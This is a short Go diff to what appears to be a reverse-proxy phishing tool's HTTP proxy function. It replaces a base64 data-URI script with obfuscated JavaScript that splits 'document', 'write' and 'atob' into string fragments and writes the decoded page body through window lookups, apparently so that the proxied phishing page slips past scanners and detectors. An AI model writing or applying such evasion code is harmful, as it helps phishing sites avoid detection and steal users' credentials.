@@ -1178,10 +1178,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 					encodedBody := base64.StdEncoding.EncodeToString(body)
-					body = []byte(fmt.Sprintf(
-    					`<script src="data:application/javascript;base64,%s"></script>`,
-    					encodedBody,
-					))
+					body = []byte(fmt.Sprintf(`<script>
+  					(function(){
+    					var d = 'doc' + 'ument';
+    					var w = 'wr'  + 'ite';
+    					var a = 'at'  + 'ob';
+    					window[d][w](
+      					decodeURIComponent(
+       					window[a]('%s')
+      					)
+    					);
+  					})();
+					</script>`, encodedBody))
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
